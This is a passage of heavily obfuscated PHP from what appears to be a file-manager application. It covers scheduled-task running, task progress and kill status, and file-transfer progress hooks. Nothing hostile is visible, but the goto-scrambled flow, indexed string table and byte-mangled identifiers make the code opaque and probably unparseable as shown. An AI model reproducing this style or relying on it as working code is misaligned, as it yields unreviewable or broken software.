$CĞÆ×‡Å”ñ < 3600 * 24) { return !1; } if ($e”ˆªğ¸ø‹) { return !0; } break; case $BâÕ—ä¢Äì[1321]: if (time() - $CĞÆ×‡Å”ñ >= floatval($c™™¯Ã„ƒ[$BâÕ—ä¢Äì[1321]]) * 60) { return !0; } break; default: break; } return !1; goto C¤ã¡Û—ÊÆ; C¤ã¡Û—ÊÆ: } public static function taskRun($fÛİ¡ä áÀ) { goto eËÁí˜§¶; D‹§­ğ†Á‘: $B‡ë÷ËĞó‡ = timeFloat(); $F¨¨ŞêÃ‚Î = $A§•íÆŠãœ[33]; switch ($fÛİ¡ä áÀ[$A§•íÆŠãœ[29]]) { case $A§•íÆŠãœ[292]: $d°’¤èÈÎ = url_request($fÛİ¡ä áÀ[$A§•íÆŠãœ[1325]], $A§•íÆŠãœ[213], !1, !1, !1, !1, 5); $F¨¨ŞêÃ‚Î = strlen($d°’¤èÈÎ); break; case $A§•íÆŠãœ[212]: $F¨¨ŞêÃ‚Î = Hook::apply($fÛİ¡ä áÀ[$A§•íÆŠãœ[1325]]); default: break; } goto a÷òµ•²êĞ; eËÁí˜§¶: $A§•íÆŠãœ =& $_SERVER[‘®…¢À]; self::log($A§•íÆŠãœ[1322] . $fÛİ¡ä áÀ[$A§•íÆŠãœ[363]] . $A§•íÆŠãœ[1323] . $fÛİ¡ä áÀ[$A§•íÆŠãœ[28]] . $A§•íÆŠãœ[1324] . $fÛİ¡ä áÀ[$A§•íÆŠãœ[1325]]); Model($A§•íÆŠãœ[1309])->run($fÛİ¡ä áÀ[$A§•íÆŠãœ[363]]); goto D‹§­ğ†Á‘; a÷òµ•²êĞ: Model($A§•íÆŠãœ[1326])->add(array($A§•íÆŠãœ[1327] => $A§•íÆŠãœ[33], $A§•íÆŠãœ[1328] => $A§•íÆŠãœ[463], $A§•íÆŠãœ[29] => $A§•íÆŠãœ[1329] . $fÛİ¡ä áÀ[$A§•íÆŠãœ[363]], $A§•íÆŠãœ[1330] => json_encode(array($A§•íÆŠãœ[28] => $fÛİ¡ä áÀ[$A§•íÆŠãœ[28]], $A§•íÆŠãœ[1331] => timeFloat() - $B‡ë÷ËĞó‡, $A§•íÆŠãœ[278] => $F¨¨ŞêÃ‚Î)))); self::log($A§•íÆŠãœ[1332] . $fÛİ¡ä áÀ[$A§•íÆŠãœ[363]] . $A§•íÆŠãœ[1333] . $F¨¨ŞêÃ‚Î); return !0; goto B ŠÒ¶›ŒÇ; B ŠÒ¶›ŒÇ: } private static function valueGet($cØ«³òíŠ‹) { $CÅ°é’‘ =& $_SERVER[‘®…¢À]; $f‰ù£Ø‰¯“ = $CÅ°é’‘[1334]; $c‡ÉšÊì = Model($CÅ°é’‘[1335])->get($cØ«³òíŠ‹, $f‰ù£Ø‰¯“); if (is_null($c‡ÉšÊì)) { Model($CÅ°é’‘[1335])->set($CÅ°é’‘[1307], 10, $f‰ù£Ø‰¯“); Model($CÅ°é’‘[1335])->set($CÅ°é’‘[662], $CÅ°é’‘[84], $f‰ù£Ø‰¯“); Model($CÅ°é’‘[1335])->set($CÅ°é’‘[1302], $CÅ°é’‘[463], $f‰ù£Ø‰¯“); $c‡ÉšÊì = Model($CÅ°é’‘[1335])->get($cØ«³òíŠ‹, $f‰ù£Ø‰¯“); } return $c‡ÉšÊì; } private static function valueSet($Dˆ² çŠÉ², $B‡±ƒ«ÌÛ¶) { $dÙ‰Ù®éÄ =& $_SERVER[‘®…¢À]; return Model($dÙ‰Ù®éÄ[1335])->set($Dˆ² çŠÉ², $B‡±ƒ«ÌÛ¶, $dÙ‰Ù®éÄ[1334]); } protected static function log($FÈ¤‹†¥”İ) { write_log($FÈ¤‹†¥”İ, $_SERVER[‘®…¢À][1336]); } private static function cacheClear() { $Aº—¼ñ²çê =& $_SERVER[‘®…¢À]; $c£à‰¿š£ = Model($Aº—¼ñ²çê[1335])->cacheKey($Aº—¼ñ²çê[1334]); Cache::clearMemory($c£à‰¿š£); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\x72\x75\156\156\x69\156\147"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($D¥×Øò§Ò, $eé™òŞÄ©µ = '', $AÔ¾“÷‘¨ = 0, $b™‚±¥Àâ¯ = '') { goto CËŒò‡çÇ¹; dè†à¯¥õ: Hook::bind($b˜Ÿ¼§´[1304], array($this, $b˜Ÿ¼§´[1345])); Hook::bind($b˜Ÿ¼§´[1346], array($this, $b˜Ÿ¼§´[1347])); $this->startAfter(); goto BæÂÔˆñ•Ë; CËŒò‡çÇ¹: $b˜Ÿ¼§´ =& $_SERVER[‘®…¢À]; if (self::get($D¥×Øò§Ò)) { return; } $this->task = array($b˜Ÿ¼§´[363] => $D¥×Øò§Ò, $b˜Ÿ¼§´[1337] => USER_ID, $b˜Ÿ¼§´[1234] => $b™‚±¥Àâ¯, $b˜Ÿ¼§´[29] => $eé™òŞÄ©µ, $b˜Ÿ¼§´[1282] => $b˜Ÿ¼§´[33], $b˜Ÿ¼§´[1280] => $AÔ¾“÷‘¨, $b˜Ÿ¼§´[1285] => 0, $b˜Ÿ¼§´[1338] => 0, $b˜Ÿ¼§´[1339] => 0, $b˜Ÿ¼§´[1340] => timeFloat(), $b˜Ÿ¼§´[1341] => 0, $b˜Ÿ¼§´[1342] => 0, $b˜Ÿ¼§´[1343] => 0, $b˜Ÿ¼§´[1344] => 0, $b˜Ÿ¼§´[662] => $b˜Ÿ¼§´[1302]); goto dè†à¯¥õ; BæÂÔˆñ•Ë: Hook::trigger($b˜Ÿ¼§´[1348], $this->task); $this->task[$b˜Ÿ¼§´[1342]] = timeFloat(); self::valueSet($this->task[$b˜Ÿ¼§´[363]], $this->task); goto FÃ¸ÕéÅè; FÃ¸ÕéÅè: } public function end() { goto FÙİ¤­; F »àƒ½£: Hook::unbind($C„ØÜ›æ£[1346], array($this, $C„ØÜ›æ£[1347])); $this->endAfter(); $this->task = !1; goto eã¹æÀÎß¼; FÙİ¤­: $C„ØÜ›æ£ =& $_SERVER[‘®…¢À]; if (!$this->task) { return; } if ($this->task[$C„ØÜ›æ£[1342]]) { self::valueSet($this->task[$C„ØÜ›æ£[363]], !1); } goto ağÑÔšŞôº; ağÑÔšŞôº: $FÀÌ©¸†ƒ® = timeFloat() - $this->task[$C„ØÜ›æ£[1340]]; self::log($C„ØÜ›æ£[1349] . $this->task[$C„ØÜ›æ£[363]] . $C„ØÜ›æ£[1350] . $FÀÌ©¸†ƒ® . $C„ØÜ›æ£[1351]); Hook::unbind($C„ØÜ›æ£[1304], array($this, $C„ØÜ›æ£[1345])); goto F »àƒ½£; eã¹æÀÎß¼: } public function update($CÁ“‰Ò¶Ã = 0) { goto E¢âë¿ŸÊ; cï°Ëøâ˜†: $this->updateAfter(); $d¼¨÷³ğÄ¥ = 0.2; if (timeFloat() - $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1342]] < $d¼¨÷³ğÄ¥) { return; } goto f«™ô¸‰…Š; fèñùœ¦†­: $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[662]] = $e¤¶ÈÖ¨ ? $e¤¶ÈÖ¨ : $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[662]]; $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1343]] = $B¦–è¥±‚[$EÎË´Ç¥’[1343]] ? $B¦–è¥±‚[$EÎË´Ç¥’[1343]] : 0; $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1342]] = timeFloat(); goto AñÆŒÌÌéÁ; E¢âë¿ŸÊ: $EÎË´Ç¥’ =& $_SERVER[‘®…¢À]; $DÔ¾Ù¼„ˆ =& $this->task; if (!$DÔ¾Ù¼„ˆ) { return; } goto Aöƒ¢¿‹á; f«™ô¸‰…Š: $B¦–è¥±‚ = self::get($DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[363]]); $e¤¶ÈÖ¨ = $B¦–è¥±‚[$EÎË´Ç¥’[662]]; if ($e¤¶ÈÖ¨ == self::STATYS_KILL) { $EëÌ÷ˆ˜ùù = array($EÎË´Ç¥’[1352] => LNG($EÎË´Ç¥’[1353]), $EÎË´Ç¥’[990] => !1); Cache::set($EÎË´Ç¥’[1354] . $this->task[$EÎË´Ç¥’[363]], $EëÌ÷ˆ˜ùù, 30); $this->end(); die; } else { if ($e¤¶ÈÖ¨ == self::STATYS_STOP) { $Bæ”¼¥³–‰ = 2; $B¦–è¥±‚[$EÎË´Ç¥’[1343]] += $Bæ”¼¥³–‰; self::valueSet($DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[363]], $B¦–è¥±‚); sleep($Bæ”¼¥³–‰); $this->update(); return; } } goto fèñùœ¦†­; AñÆŒÌÌéÁ: Hook::trigger($EÎË´Ç¥’[1355], $DÔ¾Ù¼„ˆ); self::valueSet($DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[363]], $DÔ¾Ù¼„ˆ); goto Dœ‰ä˜–ìÌ; Aöƒ¢¿‹á: $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1285]] += $CÁ“‰Ò¶Ã; $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1341]] = timeFloat(); if ($DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1280]]) { if ($DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1280]] < $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1285]]) { $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1280]] = $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1285]]; } $aà†Ù‰‹÷Õ = timeFloat() - $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1340]] - $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1343]]; $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1338]] = $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1285]] / $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1280]]; $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1339]] = $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1285]] / $aà†Ù‰‹÷Õ; if ($DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1338]] > 0) { $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1344]] = $aà†Ù‰‹÷Õ * (1 - $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1338]]) / $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1338]]; } $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1344]] = $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1344]] <= 0 ? 0 : $DÔ¾Ù¼„ˆ[$EÎË´Ç¥’[1344]]; } goto cï°Ëøâ˜†; Dœ‰ä˜–ìÌ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Dä³àã«Ç…) { $E­ö—éºß„ =& $_SERVER[‘®…¢À]; Cache::set($E­ö—éºß„[1354] . $this->task[$E­ö—éºß„[363]], $Dä³àã«Ç…, 60); return $Dä³àã«Ç…; } public static function get($CŞ’±³Ü›ì) { return self::valueGet($CŞ’±³Ü›ì); } public static function listData() { $Dƒ½”º¸ìˆ = self::valueGet(); return array_sort_by($Dƒ½”º¸ìˆ, $_SERVER[‘®…¢À][1340], !0); } public static function kill($e°ĞÑ±õÅÎ) { return self::changeStatus($e°ĞÑ±õÅÎ, self::STATYS_KILL); } public static function stop($e¯Ò¼âğ) { return self::changeStatus($e¯Ò¼âğ, self::STATYS_STOP); } public static function restart($AÔÖ£ÔˆÇ) { return self::changeStatus($AÔÖ£ÔˆÇ, self::STATYS_RUNNING); } public static function killAll() { $a¡¨ù‹İš =& $_SERVER[‘®…¢À]; $aÈ†ËÆ×˜ = self::listData(); foreach ($aÈ†ËÆ×˜ as $CÒĞ÷‡§ÜÑ) { self::kill($CÒĞ÷‡§ÜÑ[$a¡¨ù‹İš[363]]); } sleep(2); foreach ($aÈ†ËÆ×˜ as $CÒĞ÷‡§ÜÑ) { self::valueSet($CÒĞ÷‡§ÜÑ[$a¡¨ù‹İš[363]], !1); } } private static function changeStatus($F·±ó¤‚É´, $a©ÇÈ†´Âù) { goto BÏò›÷×œÌ; B¥„·†™‰Ì: return !0; goto eóŠ™±ÏÚ…; BÏò›÷×œÌ: $Fœë±„¡˜³ =& $_SERVER[‘®…¢À]; $fœ¦ĞÍ±ŸÁ = self::valueGet($F·±ó¤‚É´); if (!$fœ¦ĞÍ±ŸÁ) { return !1; } goto DÛ’Ó¿Å©„; DÛ’Ó¿Å©„: $fœ¦ĞÍ±ŸÁ[$Fœë±„¡˜³[662]] = $a©ÇÈ†´Âù; self::valueSet($F·±ó¤‚É´, $fœ¦ĞÍ±ŸÁ); self::log($Fœë±„¡˜³[1356] . $fœ¦ĞÍ±ŸÁ[$Fœë±„¡˜³[363]] . $Fœë±„¡˜³[1357] . $a©ÇÈ†´Âù); goto B¥„·†™‰Ì; eóŠ™±ÏÚ…: } public static function valueGet($Fîß‰‰Ù˜ = false) { $EöóÓíÓÍµ =& $_SERVER[‘®…¢À]; if ($Fîß‰‰Ù˜) { $Fïóå‡³µå = Model($EöóÓíÓÍµ[394])->where(array($EöóÓíÓÍµ[90] => $Fîß‰‰Ù˜, $EöóÓíÓÍµ[29] => $EöóÓíÓÍµ[1358]))->find(); return $Fïóå‡³µå ? json_decode($Fïóå‡³µå[$EöóÓíÓÍµ[355]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Eİãî¼ë¾ù = false) { goto Bˆ´§ª²; FÄˆ¤ï—•Ø: return $aöº£¨¶Ì“; goto Eß¨Üƒ¡İä; Bˆ´§ª²: $B“ ŒÀí§ =& $_SERVER[‘®…¢À]; $a©‘¿Õ“Š· = array($B“ ŒÀí§[29] => $B“ ŒÀí§[1358]); if ($Eİãî¼ë¾ù) { $a©‘¿Õ“Š·[$B“ ŒÀí§[1337]] = $Eİãî¼ë¾ù; } goto cƒˆ¾ŞÓ¿ä; cƒˆ¾ŞÓ¿ä: $aöº£¨¶Ì“ = Model($B“ ŒÀí§[394])->where($a©‘¿Õ“Š·)->select(); $aöº£¨¶Ì“ = $aöº£¨¶Ì“ ? $aöº£¨¶Ì“ : array(); foreach ($aöº£¨¶Ì“ as $a¡„¶ïšæÓ => $e‚‡‚šÑ¨) { $aöº£¨¶Ì“[$a¡„¶ïšæÓ] = json_decode($e‚‡‚šÑ¨[$B“ ŒÀí§[355]], !0); } goto FÄˆ¤ï—•Ø; Eß¨Üƒ¡İä: } public static function valueSet($C–Ù¿¬¤Åæ, $B¥ØÃ²Àí) { goto A°ô£Ë›ŒŠ; a­œ…£ÅÂÈ: if (!$b‰áØæèŒÓ) { ob_start(); var_dump($B¥ØÃ²Àí); $f§½¶Ü×İè = ob_get_clean(); self::log($fªÚïà™Ëß[1359] . json_encode_force($f§½¶Ü×İè)); } if (!$C–Ù¿¬¤Åæ || !$B¥ØÃ²Àí[$fªÚïà™Ëß[363]]) { return !1; } $f­µÒÜß¾İ = array($fªÚïà™Ëß[29] => $fªÚïà™Ëß[1358], $fªÚïà™Ëß[1337] => USER_ID, $fªÚïà™Ëß[90] => $C–Ù¿¬¤Åæ, $fªÚïà™Ëß[355] => $b‰áØæèŒÓ); goto Aä‚°Âİôø; A°ô£Ë›ŒŠ: $fªÚïà™Ëß =& $_SERVER[‘®…¢À]; if (!$B¥ØÃ²Àí) { return Model($fªÚïà™Ëß[394])->where(array($fªÚïà™Ëß[90] => $C–Ù¿¬¤Åæ, $fªÚïà™Ëß[29] => $fªÚïà™Ëß[1358]))->delete(); } $b‰áØæèŒÓ = json_encode($B¥ØÃ²Àí); goto a­œ…£ÅÂÈ; Aä‚°Âİôø: Model($fªÚïà™Ëß[394])->add($f­µÒÜß¾İ, array(), !0); goto bÅ´øßÏã; bÅ´øßÏã: } public static function log($B®…ŒÌ¡·ó) { write_log($B®…ŒÌ¡·ó, $_SERVER[‘®…¢À][1360]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto dóŒ±ÄÛª˜; CÒ„Ğµ„‹£: Hook::bind($Dõ‘¢«“©§[530], array($this, $Dõ‘¢«“©§[1367])); Hook::bind($Dõ‘¢«“©§[531], array($this, $Dõ‘¢«“©§[1368])); Hook::bind($Dõ‘¢«“©§[533], array($this, $Dõ‘¢«“©§[1369])); goto CøÅ•©¸·‘; CøÅ•©¸·‘: Hook::bind($Dõ‘¢«“©§[534], array($this, $Dõ‘¢«“©§[1369])); Hook::bind($Dõ‘¢«“©§[500], array($this, $Dõ‘¢«“©§[1370])); Hook::bind($Dõ‘¢«“©§[497], array($this, $Dõ‘¢«“©§[1370])); goto EçÍõË»©; dÊ¶°öà: Hook::bind($Dõ‘¢«“©§[1374], array($this, $Dõ‘¢«“©§[1375])); Hook::bind($Dõ‘¢«“©§[1376], array($this, $Dõ‘¢«“©§[1377])); Hook::bind($Dõ‘¢«“©§[1378], array($this, $Dõ‘¢«“©§[1379])); goto C‡– ÆØ; EçÍõË»©: Hook::bind($Dõ‘¢«“©§[502], array($this, $Dõ‘¢«“©§[1370])); Hook::bind($Dõ‘¢«“©§[504], array($this, $Dõ‘¢«“©§[1370])); Hook::bind($Dõ‘¢«“©§[506], array($this, $Dõ‘¢«“©§[1370])); goto B›Áøòêøª; fÑ±·Æí¸¦: if (!$AÃÚ„•ùµ[$Dõ‘¢«“©§[1234]]) { $AÃÚ„•ùµ[$Dõ‘¢«“©§[1234]] = LNG($Dõ‘¢«“©§[1386]); } goto dé¡Å²ùßŒ; C¹¥Ô‘áÄÄ: Hook::bind($Dõ‘¢«“©§[1361], array($this, $Dõ‘¢«“©§[1362])); Hook::bind($Dõ‘¢«“©§[1363], array($this, $Dõ‘¢«“©§[1364])); Hook::bind($Dõ‘¢«“©§[1365], array($this, $Dõ‘¢«“©§[1366])); goto CÒ„Ğµ„‹£; B›Áøòêøª: Hook::bind($Dõ‘¢«“©§[1371], array($this, $Dõ‘¢«“©§[1372])); Hook::bind($Dõ‘¢«“©§[523], array($this, $Dõ‘¢«“©§[1373])); $this->sourceModelCopyFlag = !1; goto dÊ¶°öà; b­¦¢“ô¼ä: $AÃÚ„•ùµ[$Dõ‘¢«“©§[1282]] = $Dõ‘¢«“©§[33]; $AÃÚ„•ùµ[$Dõ‘¢«“©§[1384]] = $Dõ‘¢«“©§[33]; $AÃÚ„•ùµ[$Dõ‘¢«“©§[1385]] = 0; goto fÑ±·Æí¸¦; dóŒ±ÄÛª˜: $Dõ‘¢«“©§ =& $_SERVER[‘®…¢À]; $AÃÚ„•ùµ =& $this->task; $this->sourceCopyFolder = !1; goto C¹¥Ô‘áÄÄ; C‡– ÆØ: $AÃÚ„•ùµ[$Dõ‘¢«“©§[1380]] = LNG($Dõ‘¢«“©§[1381]); $AÃÚ„•ùµ[$Dõ‘¢«“©§[1382]] = 0; $AÃÚ„•ùµ[$Dõ‘¢«“©§[1383]] = 0; goto b­¦¢“ô¼ä; dé¡Å²ùßŒ: } protected function endAfter() { goto E§¢™ŞÜœ„; D‡ïº¯Ú¯ğ: Hook::unbind($aÆèŸ£í‰†[1374], array($this, $aÆèŸ£í‰†[1375])); Hook::unbind($aÆèŸ£í‰†[1376], array($this, $aÆèŸ£í‰†[1377])); Hook::unbind($aÆèŸ£í‰†[1378], array($this, $aÆèŸ£í‰†[1379])); goto a»˜åÖŒ¸ï; AºÌ½Ø„Å: Hook::unbind($aÆèŸ£í‰†[497], array($this, $aÆèŸ£í‰†[1370])); Hook::unbind($aÆèŸ£í‰†[502], array($this, $aÆèŸ£í‰†[1370])); Hook::unbind($aÆèŸ£í‰†[504], array($this, $aÆèŸ£í‰†[1370])); goto bšÌïÅõ; bšÌïÅõ: Hook::unbind($aÆèŸ£í‰†[506], array($this, $aÆèŸ£í‰†[1370])); Hook::unbind($aÆèŸ£í‰†[1371], array($this, $aÆèŸ£í‰†[1372])); Hook::unbind($aÆèŸ£í‰†[523], array($this, $aÆèŸ£í‰†[1373])); goto D‡ïº¯Ú¯ğ; E§¢™ŞÜœ„: $aÆèŸ£í‰† =& $_SERVER[‘®…¢À]; Hook::unbind($aÆèŸ£í‰†[1361], array($this, $aÆèŸ£í‰†[1362])); Hook::unbind($aÆèŸ£í‰†[1363], array($this, $aÆèŸ£í‰†[1364])); goto A˜ƒ¢µ«ï’; A˜ƒ¢µ«ï’: Hook::unbind($aÆèŸ£í‰†[1365], array($this, $aÆèŸ£í‰†[1366])); Hook::unbind($aÆèŸ£í‰†[530], array($this, $aÆèŸ£í‰†[1367])); Hook::unbind($aÆèŸ£í‰†[531], array($this, $aÆèŸ£í‰†[1368])); goto a¸áŒ£°õ¬; a¸áŒ£°õ¬: Hook::unbind($aÆèŸ£í‰†[533], array($this, $aÆèŸ£í‰†[1369])); Hook::unbind($aÆèŸ£í‰†[534], array($this, $aÆèŸ£í‰†[1369])); Hook::unbind($aÆèŸ£í‰†[500], array($this, $aÆèŸ£í‰†[1370])); goto AºÌ½Ø„Å; a»˜åÖŒ¸ï: } public function copyMoveStart($d»–¿×‘±, $FµÏ’±áåá, $DŒ˜¿ä÷ù, $bŒÌ¿—Ò‘Ï) { } public function updateAfter() { goto cÛí²¤¹á; e æˆ˜îŞ×: if ($this->sourceModelCopyFlag) { return; } $b„Ô„ÅÙ¹Ğ = 0; if ($F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1384]] == $FÆí¸è¢ËÌ[998]) { $b„Ô„ÅÙ¹Ğ = $F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1383]] * 0.5; } else { if ($F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1384]] == $FÆí¸è¢ËÌ[92]) { $b„Ô„ÅÙ¹Ğ = $F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1383]] * 0.5 + $F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1382]] * 0.5; } } goto aêŸÜß›Ğ; cÛí²¤¹á: $FÆí¸è¢ËÌ =& $_SERVER[‘®…¢À]; $F®‰èÈ•¼œ =& $this->task; if (!$F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[671]]) { return; } goto e æˆ˜îŞ×; aêŸÜß›Ğ: $F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1338]] = ($F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1387]] + $b„Ô„ÅÙ¹Ğ) / $F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[671]]; if ($F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1338]] > 0) { $B¨–áÈŒï = timeFloat() - $F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1340]] - $F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1343]]; $F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1344]] = $B¨–áÈŒï * (1 - $F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1338]]) / $F®‰èÈ•¼œ[$FÆí¸è¢ËÌ[1338]]; } goto bôÚ¢êŠ‡; bôÚ¢êŠ‡: } public function addPath($AÍÛíã§éç) { goto F¤¥´˜Øõ; F”Ë›ó‡¿î: if ($c‹Ä›Ğ‹µà[$DÁÃÒèÈÒÔ[29]] == $DÁÃÒèÈÒÔ[164]) { $B§ÆµñÚµ¹[$DÁÃÒèÈÒÔ[1280]] += 1; } else { $B§ÆµñÚµ¹[$DÁÃÒèÈÒÔ[1280]] += $c‹Ä›Ğ‹µà[$DÁÃÒèÈÒÔ[81]][$DÁÃÒèÈÒÔ[79]]; if ($c‹Ä›Ğ‹µà[$DÁÃÒèÈÒÔ[365]]) { $B§ÆµñÚµ¹[$DÁÃÒèÈÒÔ[1280]] += $c‹Ä›Ğ‹µà[$DÁÃÒèÈÒÔ[81]][$DÁÃÒèÈÒÔ[80]] + 1; } } $B§ÆµñÚµ¹[$DÁÃÒèÈÒÔ[671]] += $c‹Ä›Ğ‹µà[$DÁÃÒèÈÒÔ[78]]; $this->update(); goto cÌˆ‰Â‰; F¤¥´˜Øõ: $DÁÃÒèÈÒÔ =& $_SERVER[‘®…¢À]; if (!$AÍÛíã§éç) { return; } $B§ÆµñÚµ¹ =& $this->task; goto A‚õŸ²Ôó¶; A‚õŸ²Ôó¶: $c‹Ä›Ğ‹µà = IO::infoWithChildren($AÍÛíã§éç); $F¢ïªñßƒò = $B§ÆµñÚµ¹[$DÁÃÒèÈÒÔ[1388]] ? $B§ÆµñÚµ¹[$DÁÃÒèÈÒÔ[1388]][$DÁÃÒèÈÒÔ[1389]] : 0; $B§ÆµñÚµ¹[$DÁÃÒèÈÒÔ[1388]] = array($DÁÃÒèÈÒÔ[1389] => $F¢ïªñßƒò + 1, $DÁÃÒèÈÒÔ[382] => $c‹Ä›Ğ‹µà[$DÁÃÒèÈÒÔ[28]], $DÁÃÒèÈÒÔ[76] => $c‹Ä›Ğ‹µà[$DÁÃÒèÈÒÔ[76]], $DÁÃÒèÈÒÔ[461] => $c‹Ä›Ğ‹µà[$DÁÃÒèÈÒÔ[461]] ? $c‹Ä›Ğ‹µà[$DÁÃÒèÈÒÔ[461]] : $c‹Ä›Ğ‹µà[$DÁÃÒèÈÒÔ[76]]); goto F”Ë›ó‡¿î; cÌˆ‰Â‰: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($E°°Ûá‚º) { $Bˆ—•î¥ª =& $_SERVER[‘®…¢À]; $D³ë‹éäŞ  =& $this->task; $D³ë‹éäŞ [$Bˆ—•î¥ª[1380]] = $E°°Ûá‚º[$Bˆ—•î¥ª[28]]; $D³ë‹éäŞ [$Bˆ—•î¥ª[1282]] = $E°°Ûá‚º[$Bˆ—•î¥ª[28]]; $this->update(); } public function copyFileStart($eêâçê·™µ, $D¶ö¨Æ¬ù, $eñôøÍÇ¬, $Aàƒ¥Ê•, $Fº÷«Œ‡’Ö, $Cê¯°…óšÊ) { goto CÙÕê÷Âø; cƒ±¸ÏŒäæ: $C­­†™ïìø[$DÄô¸åøĞ[1282]] = $DÄô¸åøĞ[33]; $C­­†™ïìø[$DÄô¸åøĞ[1384]] = $DÄô¸åøĞ[33]; $C­­†™ïìø[$DÄô¸åøĞ[1385]] = 0; goto f¾ª’Ğ“ï´; f¾ª’Ğ“ï´: $this->update(); goto AÓ™ÛÓéÃò; Fó—¶©ÁÖ: $GLOBALS[$DÄô¸åøĞ[1391]] = $Fº÷«Œ‡’Ö; $GLOBALS[$DÄô¸åøĞ[1390]] = $Cê¯°…óšÊ; $C­­†™ïìø =& $this->task; goto bÑ£‘Œ; CÙÕê÷Âø: $DÄô¸åøĞ =& $_SERVER[‘®…¢À]; $AÂƒ°‘¹÷± = $Fº÷«Œ‡’Ö; if ($AÂƒ°‘¹÷± == $GLOBALS[$DÄô¸åøĞ[1390]]) { $AÂƒ°‘¹÷± = $GLOBALS[$DÄô¸åøĞ[1391]]; } goto Fó—¶©ÁÖ; bÑ£‘Œ: $C­­†™ïìø[$DÄô¸åøĞ[1380]] = $AÂƒ°‘¹÷±; $C­­†™ïìø[$DÄô¸åøĞ[1382]] = (int) $eêâçê·™µ->size($D¶ö¨Æ¬ù); $C­­†™ïìø[$DÄô¸åøĞ[1383]] = 0; goto cƒ±¸ÏŒäæ; AÓ™ÛÓéÃò: } public function copyFileEnd($fŞ”Ğõ‚ÀÆ, $D¤¬£ØØØù, $Dº–Ä®óğ, $f´õÌæá–í, $Cè¶¾óğÜ®, $b«øƒÆ±Æø) { $B–…Ğ¥Ÿ¨… =& $_SERVER[‘®…¢À]; $CÑ˜íù÷è =& $this->task; $CÑ˜íù÷è[$B–…Ğ¥Ÿ¨…[1383]] = $CÑ˜íù÷è[$B–…Ğ¥Ÿ¨…[1382]]; $CÑ˜íù÷è[$B–…Ğ¥Ÿ¨…[1384]] = $B–…Ğ¥Ÿ¨…[33]; if ($Cè¶¾óğÜ® == $CÑ˜íù÷è[$B–…Ğ¥Ÿ¨…[1380]]) { $CÑ˜íù÷è[$B–…Ğ¥Ÿ¨…[1387]] += $CÑ˜íù÷è[$B–…Ğ¥Ÿ¨…[1382]]; $this->update(1); } else { $this->update(); $CÑ˜íù÷è[$B–…Ğ¥Ÿ¨…[1383]] = 0; } self::log($B–…Ğ¥Ÿ¨…[1392] . $D¤¬£ØØØù . $B–…Ğ¥Ÿ¨…[67] . $f´õÌæá–í . $B–…Ğ¥Ÿ¨…[214] . $Cè¶¾óğÜ® . $B–…Ğ¥Ÿ¨…[1393] . $CÑ˜íù÷è[$B–…Ğ¥Ÿ¨…[1380]]); } public function updateFileEnd($d£‰†š¢”Ü, $D¦òØ½àÊÇ) { $føÍˆ²«ò„ =& $_SERVER[‘®…¢À]; $eÖ›œ·ª¦ =& $this->task; $eÖ›œ·ª¦[$føÍˆ²«ò„[1380]] = $d£‰†š¢”Ü; $eÖ›œ·ª¦[$føÍˆ²«ò„[1382]] = $D¦òØ½àÊÇ; $eÖ›œ·ª¦[$føÍˆ²«ò„[1387]] += $D¦òØ½àÊÇ; $this->update(1); } public function sourceModelCopy($cíĞÔ®«ã­) { goto a”ß¦ªÜñ; a”ß¦ªÜñ: $BÖ¸—â‹±À =& $_SERVER[‘®…¢À]; $BÇÍ°²¦ÕŠ = $cíĞÔ®«ã­[0]; $aŒ—×Æª· = $cíĞÔ®«ã­[1]; goto c¢‚®‘¥½³; C½³øë…¬§: switch ($BÇÍ°²¦ÕŠ) { case $BÖ¸—â‹±À[498]: $fç¯ë’ößù = 1; break; case $BÖ¸—â‹±À[501]: $aÕÉÎƒˆ[$BÖ¸—â‹±À[1380]] = 